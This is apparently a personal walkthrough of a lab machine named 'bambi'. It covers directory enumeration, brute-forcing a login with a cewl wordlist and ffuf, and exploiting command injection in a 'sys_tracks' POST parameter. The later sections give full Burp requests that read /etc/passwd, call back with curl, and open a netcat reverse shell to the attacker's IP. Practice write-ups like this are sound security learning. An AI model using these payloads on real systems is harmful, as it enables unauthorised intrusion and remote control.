#### Box Start
- Began `nmap`, `gobuster` and through `gobuster` identified the `/dev/` directory exposed:
![[Pasted image 20241202193950.png]]

--------------
#### Credential Fuzzing and Login
- With usernames found on the machine `Sam, Devon, Johnny` utilized `cewl` to generate a password list against the website due to the website being strictly focused on a specific music hobby.
- Utilized `cewl` command below to create a custom password list with words taken off the `http://bambi` website
```bash
cewl --write passwords.txt http://bambi
```
once `passwords.txt` was created utilized `ffuf` with valid usernames to identify `login` credentials

```bash
ffuf -w passwords.txt -u http://bambi/dev/index.php -X POST -d 'username=Sam&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' 
```
was able to identify that the size of this was an outlier
![[Pasted image 20241110021818.png]]
with the credentials  `SAM:ANGELES` was able to login
![[Pasted image 20241110022438.png]]

-----------

#### RCE Identification

- After logging in we get brought to the `SYSTEM INFO PAGE` this allows us to check to fields - `SYSTEM INFORMATION` & `TRACK LISTING` once they're checked and hit submit we look at `BURPSUITE` and identify `2` parameters

The parameters `sys_info=` and `sys_tracks=` look like parameters that could be exploited.
![[Pasted image 20241111113848.png]]
originally I tried to replace the `-h` in `sys_info` and the file path in `sys_tracks` however - even after changing them the response still shows the default options, this could potentially mean that they are hard coded into the web page
![[Pasted image 20241111114417.png]]

##### Vulnerable field testing
In order to exploit this we end up identifying `LCE` by appending `;` to the `sys_tracks` field
```http
POST /dev/admin.php HTTP/1.1

Host: bambi
Content-Length: 63
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bambi
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bambi/dev/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=a3b6945256d08ae6372daaaca7b8c375
Connection: keep-alive

sys_info=-h&sys_tracks=%2Fvar%2Ftmp%2Ftracks%2F;cat+/etc/passwd
```
this returns `/etc/passwd`
![[Pasted image 20241111120056.png]]
original payload o begin testing:
```bash
curl http://192.168.45.222:80/bambi/
```
full encoded in burpsuite:
```http
POST /dev/admin.php HTTP/1.1
Host: bambi
Content-Length: 88
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bambi
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bambi/dev/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=a3b6945256d08ae6372daaaca7b8c375
Connection: keep-alive

sys_info=-h&sys_tracks=%2Fvar%2Ftmp%2Ftracks%2F;curl+http%3a//192.168.45.222%3a80/bambi/
```
the response displays no indication that it worked
![[Pasted image 20241111115711.png]]
however if we check the `/var/log/apache2/access.log` we can see that the `curl` worked
```bash
┌──(root💀gobots)-[11Nov2024 16:35:50]-[/var/log/apache2]
└─# less /var/log/apache2/access.log
```
`curl` hitting our 
![[Pasted image 20241111120007.png]]

-------

#### Exploiting RCE

can see that `nc` exists on the system with `which nc` - URL encoded of course
![[Pasted image 20241111120243.png]]
setting up `nc` listener on `kali`
```bash
┌──(root💀gobots)-[11Nov2024 17:04:20]-[/var/log/apache2]
└─# nc -lvnp 1337                   
listening on [any] 1337 ...
```
creating payload to get a reverse shell:
```bash
/bin/nc 192.168.45.222 1337 -e /bin/bash
```
full burpsuite payload with url encoding `CTRL+U`
```http
POST /dev/admin.php HTTP/1.1
Host: bambi
Content-Length: 88
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bambi
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bambi/dev/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=a3b6945256d08ae6372daaaca7b8c375
Connection: keep-alive

sys_info=-h&sys_tracks=%2Fvar%2Ftmp%2Ftracks%2F;/bin/nc+192.168.45.222+1337+-e+/bin/bash
```
![[Pasted image 20241111121110.png]]